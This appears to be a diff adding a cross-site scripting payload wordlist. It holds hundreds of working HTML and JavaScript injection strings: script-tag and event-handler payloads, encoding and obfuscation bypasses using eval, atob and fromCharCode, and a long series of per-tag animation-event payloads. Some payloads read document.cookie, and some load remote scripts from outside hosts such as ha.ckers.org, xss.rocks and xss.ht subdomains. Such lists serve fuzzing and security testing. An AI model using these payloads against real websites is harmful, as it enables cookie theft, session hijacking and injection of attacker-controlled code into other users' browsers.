@@ -1,0 +1,750 @@
+!--" /><script>alert('xss');</script>
+"'/>;</style><script>a=eval;b=alert;a(b(/ XSSPOSED/.source));</script>'">
+"'>alert(1)</Script><Svg><Script/1='
+"'>alert(1)</script><script/1='"
+"'`><p><svg><script>a='hello';javascript:alert(1)//';</script></p>
+"/></a></><img src=1.gif onerror=alert(1)>
+"/><img/onerror= javascript:alert(1) src=xxx:x />
+"/><img/onerror=%0Cjavascript:alert(1)%0Csrc=xxx:x />
+"/><img/onerror=%0djavascript:alert(1)%0dsrc=xxx:x />
+"/><img/onerror='javascript:alert(1)'src=xxx:x />
+">/XaDoS/><script>alert(document.cookie)</script><script src="http://www.site.com/XSS.js"></script>
+"></iframe><script>alert(123)</script>
+"></tag><svg onload=alert(1)>
+"><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src="" alt="
+"><img src=1 onerror=alert(1)>.gif
+"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vaGFja2Vyb25lb2ZqYWFhaC54c3MuaHQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
+"><img src=x onerror=alert(1);>
+"><img src=x onerror=javascript:alert("1")>
+"><img src=x onerror=javascript:alert("A")>
+"><img src=x onerror=javascript:alert('1')>
+"><img src=x onerror=javascript:alert('A')>
+"><img src=x onerror=javascript:alert(("1"))>
+"><img src=x onerror=javascript:alert(("A"))>
+"><img src=x onerror=javascript:alert(('1'))>
+"><img src=x onerror=javascript:alert(('A'))>
+"><img src=x onerror=javascript:alert((`1`))>
+"><img src=x onerror=javascript:alert((`A`))>
+"><img src=x onerror=javascript:alert(1)>
+"><img src=x onerror=javascript:alert(`1`)>
+"><img src=x onerror=javascript:alert(`A`)>
+"><script alert(String.fromCharCode(88,83,83))</script>
+"><script>alert("XSS by %0axss")</script>><marquee><h1>XSS by xss</h1></marquee>
+"><script>alert('XSS')</script>
+"><script>alert()</script>
+"><script>alert(1337)</script>"><script>alert("XSS by %0axss</h1></marquee>
+"><script>alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))</script>
+"><svg onload=alert(1)//
+"><svg onload=alert(1);>
+"><svg onload=alert(1)>
+"><svg onload=alert(1)>.gif
+"><svg/onload=alert(1)>"@x.y
+"\'-alert(1)//"
+"`'><script> javascript:alert(1)</script>
+"`'><script>%0Cjavascript:alert(1)</script>
+"`'><script>%0djavascript:alert(1)</script>
+"`'><script>-javascript:alert(1)</script>
+#"><img src=M onerror=alert('XSS');>
+$ <ScRipT 5-0*3+9/3=>alert(1)</ScRipT giveanswerhere=?------
+%0A%0D%0A<script>alert(1)</script>
+'""><script language="JavaScript"> alert('X %0aS %0aS');</script>
+'"--></style></script><script>shadowlabs(0x000045)</script>
+'"></title><script>alert("XSS by %0axss")</script>><marquee><h1>XSS by xss</h1></marquee>
+'"></title><script>alert(1111)</script>
+'"></title><script>alert(1337)</script>><marquee><h1>XSS by xss</h1></marquee>
+'">><script>alert('XSS')</script>
+'-document.write`<h1>juniorEXPLOIT</h1>`-'
+'1<svg onload=alert(1)>
+';;alert(String.fromCharCode(88,83,83))//\';;alert(String.fromCharCode(88,83,83))//";;alert(String.fromCharCode(88,83,83))//";;alert(String.fromCharCode(88,83,83))//-->;<;/SCRIPT>;";>;';>;<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;
+';alert(0)//\';alert(1)//";alert(2)//";alert(3)//--></SCRIPT>">'></title><SCRIPT>alert(4)</SCRIPT>=&{</title><script>alert(
+';alert(0)//\';alert(1)//";alert(2)//";alert(3)//--></SCRIPT>">'><SCRIPT>alert(4)</SCRIPT>=&{}");}alert(6);function xss(){//
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+'<script>window.onload=function(){document.forms[0].message.value='1';}</script>
+'> <script>alert(3)</script>
+'></select><script>alert(123)</script>
+'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src="" alt='
+'><img src=x onError=alert("OpenBugBounty")>
+'><img+sRc=l+oNerrOr=alert(document.cookie)+x>
+'><svg/onload=alert`xss`>
+'onload=alert(1)><svg/1='
+(alert)(1)
+(xss"><!--><svg/onload=alert(document.domain)>)
+*/</script>'>alert(1)/*<script/1='
+--><!-- ---> <img src=xxx:x onerror=javascript:alert(1)> -->
+/* <audio src=1 onloadstart=alert(1)//> */
+//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));
+1"><svg onload=alert(1)>
+1'"><img/src/onerror=.1|alert``>
+1<svg onload=alert(1)>
+<! foo="><script>alert(1)</script>">
+<! foo="><script>javascript:alert(1)</script>">
+<!'/*"/*/'/*/"/*--></Script><Image SrcSet=K */; OnError=alert`1` //>
+<!--<img src="--><img src=x onerror=alert(123)//">
+<!--<img src="--><img src=x onerror=javascript:alert(1)//">
+<!--><scRipT src=//14.rs>
+<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->
+<!--[if gte IE 4]><SCRIPT>document.vulnerable=true;</SCRIPT><![endif]-->
+<!--[if gte IE 4]><SCRIPT>javascript:alert(1);</SCRIPT><![endif]-->
+<!--[if<img src=x onerror=javascript:alert(1)//]> -->
+<!--[if]><script>javascript:alert(1)</script -->
+<![><img src="]><img src=x onerror=javascript:alert(1)//">
+<"';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+<--`<iMG/srC=` onerror=alert``> --!>
+<--`<img/src=` onerror=alert(1)> --!>
+<--`<img/src=` onerror=alert(document.domain)> --!>
+</ foo="><script>alert(1)</script>">
+</ foo="><script>javascript:alert(1)</script>">
+</TITLE><SCRIPT>alert("XSS");</SCRIPT>
+</script></script><<<<script><>>>><<<script>alert(123)</script>
+</script><img/*%00/src="worksinchrome:alert(1)"/%00*/onerror='eval(src)'>
+</script><script >alert(document.cookie)</script>
+</script><script>alert('XSS');</script>
+</script><svg onload=alert(1)>
+</script><svg><script>alert(1)//
+</tag><svg onload=alert(1)>
+</textarea>'"><script>alert(document.cookie)</script>
+</textarea><script>alert(/xss/)</script>
+</title><SCRIPT>document.vulnerable=true;</script>
+</title><script>alert(/xss/)</script>
+</title><script>alert(1)</script>
+<<SCRIPT>alert(“XSS");//<</SCRIPT>
+<<script>alert("xss");//<</script>
+<? foo="><script>alert(1)</script>">
+<? foo="><script>javascript:alert(1)</script>">
+<? foo="><x foo='?><script>alert(1)</script>'>">
+<? foo="><x foo='?><script>javascript:alert(1)</script>'>">
+<BODY ONLOAD=alert("XSS")>
+<BODY ONLOAD=alert('XSS')>
+<BODY ONLOAD=javascript:alert(1)>
+<HEAD><SCRIPT LANGUAGE="JavaScript">alert('XSS')</SCRIPT></HEAD>
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">",
+<IMG "><SCRIPT>alert("XSS")</SCRIPT>">
+<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
+<IMG SRC=x onerror="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onload="alert(String.fromCharCode(88,83,83))">
+<IMG “""><SCRIPT>alert(“XSS")</SCRIPT>">
+<Img src = x onerror = "javascript: window.onerror = alert; throw XSS">
+<SCRIPT =">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT FOR=document EVENT=onreadystatechange>javascript:alert(1)</SCRIPT>
+<SCRIPT onreadystatechange=javascript:javascript:alert(1);></SCRIPT>
+<SCRIPT> alert(“XSS"); </SCRIPT>
+<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>
+<SCRIPT>alert("XSS");//</SCRIPT>
+<SCRIPT>alert('XSS');</SCRIPT>
+<SCRIPT>alert('XSS')</SCRIPT>
+<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="httx://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT>document.write("XSS");</SCRIPT>
+<SVg </onlOad ="1> (_=alert,_(1)) "">
+<ScRipT 5-0*3+9/3=>alert(1)</ScRipT giveanswerhere=?
+<a 0x00 href="javascript:alert(1)">clickme</a>
+<a href=" javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="jAvAsCrIpT:alert(1)">X</a>
+<a href="javascript:javascript:alert(1)"><event-source src="data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A">
+<a href=javascript:alert(1)>click
+<a href=javascript:alert(document.cookie)>Click Here</a>
+<a onclick="alert(1)">test</a>
+<audio onerror="javascript:alert(1)"><source>
+<audio src onloadstart=alert(1)>
+<audio src/onerror=alert(1)>
+<audio src=1 href=1 onerror="javascript:alert(1)"></audio>
+<audio src=1 onerror=alert(1)>
+<body background=javascript:'"><script>alert(navigator.userAgent)</script>></body>
+<body onLoad="alert('XSS');"
+<body onerror=alert(1) onload=/>
+<body onhashchange=alert(1)><a href=#x>click this!#x
+<body onload=;a2={y:eval};a1={x:a2.y('al'+'ert')};;;;;;;;;_=a1.x;_(1);;;;
+<body onload=alert('test1')>
+<body onload=alert(1)>
+<body onpageshow=alert(1)>
+<body onresize="alert(1)">
+<body onresize=alert(1)>press F12!
+<body onunhandledrejection=alert(1)><script>fetch('//xyz')</script>
+<body src=1 href=1 onerror="javascript:alert(1)"></body>
+<dETAILS%0aopen%0aonToGgle%0a=%0aa=alert,a() x>
+<details ontoggle=alert(1) open>test</details>
+<details/ontoggle="self['wind'+'ow']['one'+'rror']=self['wind'+'ow']['ale'+'rt'];throw/**/self['doc'+'ument']['domain'];"/open>
+<div draggable="true" contenteditable>drag me</div><script ondragover=alert(1) contenteditable>drop here</script>
+<div draggable="true" contenteditable>drag me</div><script ondrop=alert(1) contenteditable>drop here</script>
+<div id="div1"><input value="``onmouseover=javascript:alert(1)"></div> <div id="div2"></div><script>
+<div id=d><div style="font-family:'sans\27\3B color\3Ared\3B'">X</div></div> <script>with(document.getElementById("d"))innerHTML=innerHTML</script>
+<div id=d><x xmlns="><iframe onload=javascript:alert(1)"></div> <script>d.innerHTML=d.innerHTML</script>
+<div onmousedown="alert(1)">test</div>
+<embed src=1 onerror=alert(1) type=image/gif>
+<frameset onload=alert(123)>
+<frameset onload=javascript:alert(1)>
+<html><noalert><noscript>(123)</noscript><script>(123)</script>
+<iframe onload=alert(1)></iframe>
+<image src/onerror=alert(1)>
+<image src=1 href=1 onerror="javascript:alert(1)"></image>
+<image src=validimage.png onload=alert(1)>
+<image srcset=1 onerror=alert(1)>
+<img """><script>alert("XSS by %0axss")</script><marquee><h1>XSS by xss</h1></marquee>
+<img src ?itworksonchrome?\/onerror = alert(1)
+<img src onerror=alert(1)>
+<img src/onerror=alert(1)>
+<img src="/" =_=" title="onerror='alert(1)'">
+<img src="WTF" onError="{var{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(/0wn3d/.source)"/>
+<img src=1 href=1 onerror="javascript:alert(1)"></img>
+<img src=1 onerror="a:b:c:d:alert(1)">
+<img src=1 onerror=alert(1)>
+<img src=`%00`&NewLine; onerror=alert(1)&NewLine;
+<img src=``%0a%0d onerror=alert(1)%0a%0d
+<img src=asdf onerror=alert(document.cookie)>
+<img src=foo.png onerror=alert(/xssed/) />
+<img src=validimage.png onload=alert(1)>
+<img src=x onerror=alert(document.domain) onerror=alert(document.domain) onerror=alert(document.domain)>
+<img src=x onerror=alert(document.domain)>/all
+<img src=x:alert(alt) onerror=eval(src) alt='spyerror'>
+<img src=x:alert(alt) onerror=eval(src) alt=0>
+<img src=xss onerror=alert(1)>
+<img srcset=1 onerror=alert(1)>
+<img/src=`%00` onerror=this.onerror=alert(1)
+<input type=image src=1 onerror=alert(1)>
+<input type=image src=validimage.png onload=alert(1)>
+<isindex type=image onload=alert(1) src=validimage.png>
+<isindex type=image src=1 onerror=alert(1)>
+<link href=validstyles.css rel=stylesheet onload=alert(1)>
+<link rel=stylesheet href=1 onerror=alert(1)>
+<marquee><script>alert('XSS')</script></marquee>
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+<object data=/ onload=alert(1)>
+<object onerror=alert(1) data=1 type=image/gif>
+<object onerror=alert(1)>
+<object src=1 href=1 onerror="javascript:alert(1)"></object>
+<p onbeforescriptexecute="alert(1)"><svg><script>\</p>
+<sCRIpt x=">" src=//15.rs></script>
+<sCrIpt/"<a"/srC=data:=".<a,[8].some(alert)>
+<sCriPt x>(((alert)))``</scRipt x>
+<sCriPt/src=//14.rs?
+<sVg><scRipt %00>alert(1) {Opera}
+<sVg><scRipt >alert(1) {Opera}
+<script "a='>'" SRC="http://fake.domain/xss.js"></script>
+<script /*%00*/>/*%00*/alert(1)/*%00*/</script /*%00*/
+<script /***/>/***/alert('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/
+<script /**/>/**/alert(1)/**/</script /**/
+<script >javascript:alert(1)</script>
+<script ^__^>alert(String.fromCharCode(49))</script ^__^
+<script a=">" '' SRC="http://fake.domain/xss.js"></script>
+<script a=">" SRC="http://fake.domain/xss.js"></script>
+<script a=">'>" SRC="http://fake.domain/xss.js"></script>
+<script a=`>` SRC="http://fake.domain/xss.js"></script>
+<script draggable="true" ondrag="alert(1)">test</script>
+<script draggable="true" ondragend="alert(1)">test</script>
+<script draggable="true" ondragenter="alert(1)">test</script>
+<script draggable="true" ondragleave="alert(1)">test</script>
+<script draggable="true" ondragstart="alert(1)">test</script>
+<script for=document event=onreadystatechange>getElementById('safe123').click()</script>
+<script id=x tabindex=1 onactivate=alert(1)></script>
+<script id=x tabindex=1 onbeforeactivate=alert(1)></script>
+<script id=x tabindex=1 onbeforedeactivate=alert(1)></script><input autofocus>
+<script id=x tabindex=1 ondeactivate=alert(1)></script><input id=y autofocus>
+<script id=x tabindex=1 onfocus=alert(1)></script>
+<script id=x tabindex=1 onfocusin=alert(1)></script>
+<script itworksinallbrowsers>/*<script* */alert(1)</script
+<script itworksinallbrowsers>/*<script* */alert(1)</script ?
+<script language="JavaScript">alert('XSS')</script>
+<script onLoad script onLoad="javascript:javascript:alert(1)"></script onLoad>
+<script onReadyStateChange script onReadyStateChange="javascript:javascript:alert(1)"></script onReadyStateChange>
+<script onbeforecopy="alert(1)" contenteditable>test</script>
+<script onbeforecut="alert(1)" contenteditable>test</script>
+<script onbeforepaste="alert(1)" contenteditable>test</script>
+<script onblur=alert(1) tabindex=1 id=x></script><input autofocus>
+<script onclick="alert(1)">test</script>
+<script oncontextmenu="alert(1)">test</script>
+<script oncopy="alert(1)" contenteditable>test</script>
+<script oncut="alert(1)" contenteditable>test</script>
+<script ondblclick="alert(1)">test</script>
+<script onerror=alert(1) src=/></script>
+<script onfocusout=alert(1) tabindex=1 id=x></script><input autofocus>
+<script onkeydown="alert(1)" contenteditable>test</script>
+<script onkeypress="alert(1)" contenteditable>test</script>
+<script onkeyup="alert(1)" contenteditable>test</script>
+<script onload=alert(1) src=validjs.js></script>
+<script onmousedown="alert(1)">test</script>
+<script onmouseenter="alert(1)">test</script>
+<script onmouseleave="alert(1)">test</script>
+<script onmousemove="alert(1)">test</script>
+<script onmouseout="alert(1)">test</script>
+<script onmouseover="alert(1)">test</script>
+<script onmouseup="alert(1)">test</script>
+<script onpaste="alert(1)" contenteditable>test</script>
+<script onreadystatechange=alert(1)></script>
+<script src="data:text/javascript,alert(1)"></script>
+<script src="data:text/plain,javascript:alert(1)"></script>
+<script src=1 href=1 onerror="javascript:alert(1)"></script>
+<script src=javascript:alert(1)>
+<script type="text/javascript">javascript:alert(1);</script>
+<script x> alert(1) </script 1=2
+<script%0C>javascript:alert(1)</script>
+<script%0Ctype="text/javascript">javascript:alert(1);</script>
+<script%0d>javascript:alert(1)</script>
+<script%0dtype="text/javascript">javascript:alert(1);</script>
+<script/x>alert(1)</script>
+<script> http://window.name=`<img src=x onerror=alert(top.document.domain)>` location=`https://some_host/?xss=<iframe
+<script> location.href = 'data:text/html;base64,PHNjcmlwdD54PW5ldyBYTUxIdHRwUmVxdWVzdCgpO3gub3BlbigiR0VUIiwiaHR0cDovL3hzc21lLmh0bWw1c2VjLm9yZy94c3NtZTIvIix0cnVlKTt4Lm9ubG9hZD1mdW5jdGlvbigpIHsgYWxlcnQoeC5yZXNwb25zZVRleHQubWF0Y2goL2RvY3VtZW50LmNvb2tpZSA9ICcoLio/KScvKVsxXSl9O3guc2VuZChudWxsKTs8L3NjcmlwdD4='; </script>
+<script>!{x(){alert(1)}}.x()</script>
+<script>$.getScript("//hackeroneofjaaah.xss.ht")</script>
+<script>'a1l2e3r4t6'.replace(/(.).(.).(.).(.).(.)/,function(match,$1,$2,$3,$4,$5) { this[$1+$2+$3+$4+$5](1); })</script>
+<script>'str1ng'.replace(/1/,alert)</script>
+<script>({0:#0=alert/#0#/#0#(0)})</script>
+<script>({0:#0=alert/#0#/#0#(123)})</script>
+<script>({0:#0=eval/#0#/#0#(javascript:alert(1))})</script>
+<script>({set/**/$($){_/**/setter=$,_=javascript:alert(1)}}).$=eval</script>
+<script>+-+-1-+-+alert(1)</script>
+<script>Array.from([1],alert)</script>
+<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(1)')()</script>
+<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('javascript:alert(1)')()</script>
+<script>Object.defineProperties(window, {Safe: {value: {get: function() {return document.cookie}}}});alert(Safe.get())</script>
+<script>TypeError.prototype.name ='=/',0[onerror=eval]['/-alert(1)//']</script>
+<script>alert("TEST");</script>
+<script>alert("XSS by %0axss")</script><marquee><h1>XSS by xss</h1></marquee>
+<script>alert('XSS')</script>
+<script>alert(1);</script>
+<script>alert(1)</script>
+<script>alert(String.fromCharCode(88,83,83))</script>
+<script>alert(document.cookie)</script ByPass>
+<script>alert(document.head.childNodes[3].text)</script>
+<script>alert(document.head.innerHTML.substr(146,20));</script>
+<script>alert(string.fromcharcode(88,83,83))</script>
+<script>for((i)in(self))eval(i)(1)</script>
+<script>javascript:alert(1)</script>
+<script>new class extends alert(1){}</script>
+<script>new class extends class extends class extends class extends alert(1){}{}{}{}</script>
+<script>new function(){new.target.constructor('alert(1)')();}</script>
+<script>self['alert'](2)</script>
+<script>this[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][+[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]](++[[]][+[]])</script>
+<script>this[(+{}+[])[-~[]]+(![]+[])[-~-~[]]+([][+[]]+[])[-~-~-~[]]+(!![]+[])[-~[]]+(!![]+[])[+[]]]((-~[]+[]))</script>
+<script>this[490837..toString(1<<5)](atob('YWxlcnQoMSk='))</script>
+<script>throw new class extends Function{}('alert(1)')``</script>
+<script>throw onerror=alert,'some string',123,'haha'</script>
+<script>var c = 1; alert(c)</script>
+<script>var fn=window[490837..toString(1<<5)];fn(atob('YWxlcnQoMSk='));</script>
+<script>var fn=window[String.fromCharCode(101,118,97,108)];fn(atob('YWxlcnQoMSk='));</script>
+<script>var fn=window[atob('ZXZhbA==')];fn(atob('YWxlcnQoMSk='));    </script>
+<script>var query_string="</SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>";</script>
+<script>window['alert'](0)</script>
+<script>window[490837..toString(1<<5)](atob('YWxlcnQoMSk='))</script>
+<script>x = '<!--<script>'/*</script>-->*/;alert(1)</script
+<script>x=new class extends Function{}('alert(1)'); x=new x;</script>
+<style onload=alert(1)></style>
+<style>:target {color: red;}</style><script id=x style="transition:color 10s" ontransitioncancel=alert(1)></script>
+<style>:target {color:red;}</style><script id=x style="transition:color 1s" ontransitionend=alert(1)></script>
+<style>:target {transform: rotate(180deg);}</style><script id=x style="transition:transform 2s" ontransitionrun=alert(1)></script>
+<style><!--</style><script>document.vulnerable=true;//--></script>
+<style></style <img src="about:blank" onerror=javascript:alert(1)//></style>
+<style></style%0d<img src="about:blank" onerror=javascript:alert(1)//></style>
+<style><img src="</style><img src=x onerror=alert(123)//">
+<style><img src="</style><img src=x onerror=javascript:alert(1)//">
+<style>@KeyFrames x{</style><div style=animation-name:x onanimationstart=alert(1)>
+<style>@keyframes a{}b{animation:a;}</style><b/onanimationstart=alert`${document.domain}&#x60;>
+<style>@keyframes x{}</style><a style="animation-name:x" onanimationend="alert(1)"></a>
+<style>@keyframes x{}</style><a style="animation-name:x" onanimationstart="alert(1)"></a>
+<style>@keyframes x{}</style><abbr style="animation-name:x" onanimationend="alert(1)"></abbr>
+<style>@keyframes x{}</style><abbr style="animation-name:x" onanimationstart="alert(1)"></abbr>
+<style>@keyframes x{}</style><acronym style="animation-name:x" onanimationend="alert(1)"></acronym>
+<style>@keyframes x{}</style><acronym style="animation-name:x" onanimationstart="alert(1)"></acronym>
+<style>@keyframes x{}</style><address style="animation-name:x" onanimationend="alert(1)"></address>
+<style>@keyframes x{}</style><address style="animation-name:x" onanimationstart="alert(1)"></address>
+<style>@keyframes x{}</style><applet style="animation-name:x" onanimationend="alert(1)"></applet>
+<style>@keyframes x{}</style><applet style="animation-name:x" onanimationstart="alert(1)"></applet>
+<style>@keyframes x{}</style><area style="animation-name:x" onanimationend="alert(1)"></area>
+<style>@keyframes x{}</style><area style="animation-name:x" onanimationstart="alert(1)"></area>
+<style>@keyframes x{}</style><article style="animation-name:x" onanimationend="alert(1)"></article>
+<style>@keyframes x{}</style><article style="animation-name:x" onanimationstart="alert(1)"></article>
+<style>@keyframes x{}</style><aside style="animation-name:x" onanimationend="alert(1)"></aside>
+<style>@keyframes x{}</style><aside style="animation-name:x" onanimationstart="alert(1)"></aside>
+<style>@keyframes x{}</style><b style="animation-name:x" onanimationend="alert(1)"></b>
+<style>@keyframes x{}</style><b style="animation-name:x" onanimationstart="alert(1)"></b>
+<style>@keyframes x{}</style><bdi style="animation-name:x" onanimationend="alert(1)"></bdi>
+<style>@keyframes x{}</style><bdi style="animation-name:x" onanimationstart="alert(1)"></bdi>
+<style>@keyframes x{}</style><bdo style="animation-name:x" onanimationend="alert(1)"></bdo>
+<style>@keyframes x{}</style><bdo style="animation-name:x" onanimationstart="alert(1)"></bdo>
+<style>@keyframes x{}</style><bgsound style="animation-name:x" onanimationend="alert(1)"></bgsound>
+<style>@keyframes x{}</style><bgsound style="animation-name:x" onanimationstart="alert(1)"></bgsound>
+<style>@keyframes x{}</style><big style="animation-name:x" onanimationend="alert(1)"></big>
+<style>@keyframes x{}</style><big style="animation-name:x" onanimationstart="alert(1)"></big>
+<style>@keyframes x{}</style><blink style="animation-name:x" onanimationend="alert(1)"></blink>
+<style>@keyframes x{}</style><blink style="animation-name:x" onanimationstart="alert(1)"></blink>
+<style>@keyframes x{}</style><blockquote style="animation-name:x" onanimationend="alert(1)"></blockquote>
+<style>@keyframes x{}</style><blockquote style="animation-name:x" onanimationstart="alert(1)"></blockquote>
+<style>@keyframes x{}</style><body style="animation-name:x" onanimationend="alert(1)"></body>
+<style>@keyframes x{}</style><body style="animation-name:x" onanimationstart="alert(1)"></body>
+<style>@keyframes x{}</style><br style="animation-name:x" onanimationend="alert(1)"></br>
+<style>@keyframes x{}</style><br style="animation-name:x" onanimationstart="alert(1)"></br>
+<style>@keyframes x{}</style><button style="animation-name:x" onanimationend="alert(1)"></button>
+<style>@keyframes x{}</style><button style="animation-name:x" onanimationstart="alert(1)"></button>
+<style>@keyframes x{}</style><canvas style="animation-name:x" onanimationend="alert(1)"></canvas>
+<style>@keyframes x{}</style><canvas style="animation-name:x" onanimationstart="alert(1)"></canvas>
+<style>@keyframes x{}</style><caption style="animation-name:x" onanimationend="alert(1)"></caption>
+<style>@keyframes x{}</style><caption style="animation-name:x" onanimationstart="alert(1)"></caption>
+<style>@keyframes x{}</style><center style="animation-name:x" onanimationend="alert(1)"></center>
+<style>@keyframes x{}</style><center style="animation-name:x" onanimationstart="alert(1)"></center>
+<style>@keyframes x{}</style><cite style="animation-name:x" onanimationend="alert(1)"></cite>
+<style>@keyframes x{}</style><cite style="animation-name:x" onanimationstart="alert(1)"></cite>
+<style>@keyframes x{}</style><code style="animation-name:x" onanimationend="alert(1)"></code>
+<style>@keyframes x{}</style><code style="animation-name:x" onanimationstart="alert(1)"></code>
+<style>@keyframes x{}</style><col style="animation-name:x" onanimationend="alert(1)"></col>
+<style>@keyframes x{}</style><col style="animation-name:x" onanimationstart="alert(1)"></col>
+<style>@keyframes x{}</style><colgroup style="animation-name:x" onanimationend="alert(1)"></colgroup>
+<style>@keyframes x{}</style><colgroup style="animation-name:x" onanimationstart="alert(1)"></colgroup>
+<style>@keyframes x{}</style><command style="animation-name:x" onanimationend="alert(1)"></command>
+<style>@keyframes x{}</style><command style="animation-name:x" onanimationstart="alert(1)"></command>
+<style>@keyframes x{}</style><content style="animation-name:x" onanimationend="alert(1)"></content>
+<style>@keyframes x{}</style><content style="animation-name:x" onanimationstart="alert(1)"></content>
+<style>@keyframes x{}</style><data style="animation-name:x" onanimationend="alert(1)"></data>
+<style>@keyframes x{}</style><data style="animation-name:x" onanimationstart="alert(1)"></data>
+<style>@keyframes x{}</style><dd style="animation-name:x" onanimationend="alert(1)"></dd>
+<style>@keyframes x{}</style><dd style="animation-name:x" onanimationstart="alert(1)"></dd>
+<style>@keyframes x{}</style><del style="animation-name:x" onanimationend="alert(1)"></del>
+<style>@keyframes x{}</style><del style="animation-name:x" onanimationstart="alert(1)"></del>
+<style>@keyframes x{}</style><details style="animation-name:x" onanimationend="alert(1)"></details>
+<style>@keyframes x{}</style><details style="animation-name:x" onanimationstart="alert(1)"></details>
+<style>@keyframes x{}</style><dfn style="animation-name:x" onanimationend="alert(1)"></dfn>
+<style>@keyframes x{}</style><dfn style="animation-name:x" onanimationstart="alert(1)"></dfn>
+<style>@keyframes x{}</style><dir style="animation-name:x" onanimationend="alert(1)"></dir>
+<style>@keyframes x{}</style><dir style="animation-name:x" onanimationstart="alert(1)"></dir>
+<style>@keyframes x{}</style><div style="animation-name:x" onanimationend="alert(1)"></div>
+<style>@keyframes x{}</style><div style="animation-name:x" onanimationstart="alert(1)"></div>
+<style>@keyframes x{}</style><dl style="animation-name:x" onanimationend="alert(1)"></dl>
+<style>@keyframes x{}</style><dl style="animation-name:x" onanimationstart="alert(1)"></dl>
+<style>@keyframes x{}</style><dt style="animation-name:x" onanimationend="alert(1)"></dt>
+<style>@keyframes x{}</style><dt style="animation-name:x" onanimationstart="alert(1)"></dt>
+<style>@keyframes x{}</style><element style="animation-name:x" onanimationend="alert(1)"></element>
+<style>@keyframes x{}</style><element style="animation-name:x" onanimationstart="alert(1)"></element>
+<style>@keyframes x{}</style><em style="animation-name:x" onanimationend="alert(1)"></em>
+<style>@keyframes x{}</style><em style="animation-name:x" onanimationstart="alert(1)"></em>
+<style>@keyframes x{}</style><embed style="animation-name:x" onanimationend="alert(1)"></embed>
+<style>@keyframes x{}</style><embed style="animation-name:x" onanimationstart="alert(1)"></embed>
+<style>@keyframes x{}</style><fieldset style="animation-name:x" onanimationend="alert(1)"></fieldset>
+<style>@keyframes x{}</style><fieldset style="animation-name:x" onanimationstart="alert(1)"></fieldset>
+<style>@keyframes x{}</style><figcaption style="animation-name:x" onanimationend="alert(1)"></figcaption>
+<style>@keyframes x{}</style><figcaption style="animation-name:x" onanimationstart="alert(1)"></figcaption>
+<style>@keyframes x{}</style><figure style="animation-name:x" onanimationend="alert(1)"></figure>
+<style>@keyframes x{}</style><figure style="animation-name:x" onanimationstart="alert(1)"></figure>
+<style>@keyframes x{}</style><font style="animation-name:x" onanimationend="alert(1)"></font>
+<style>@keyframes x{}</style><font style="animation-name:x" onanimationstart="alert(1)"></font>
+<style>@keyframes x{}</style><footer style="animation-name:x" onanimationend="alert(1)"></footer>
+<style>@keyframes x{}</style><footer style="animation-name:x" onanimationstart="alert(1)"></footer>
+<style>@keyframes x{}</style><form style="animation-name:x" onanimationend="alert(1)"></form>
+<style>@keyframes x{}</style><form style="animation-name:x" onanimationstart="alert(1)"></form>
+<style>@keyframes x{}</style><h1 style="animation-name:x" onanimationend="alert(1)"></h1>
+<style>@keyframes x{}</style><h1 style="animation-name:x" onanimationstart="alert(1)"></h1>
+<style>@keyframes x{}</style><header style="animation-name:x" onanimationend="alert(1)"></header>
+<style>@keyframes x{}</style><header style="animation-name:x" onanimationstart="alert(1)"></header>
+<style>@keyframes x{}</style><hgroup style="animation-name:x" onanimationend="alert(1)"></hgroup>
+<style>@keyframes x{}</style><hgroup style="animation-name:x" onanimationstart="alert(1)"></hgroup>
+<style>@keyframes x{}</style><hr style="animation-name:x" onanimationend="alert(1)"></hr>
+<style>@keyframes x{}</style><hr style="animation-name:x" onanimationstart="alert(1)"></hr>
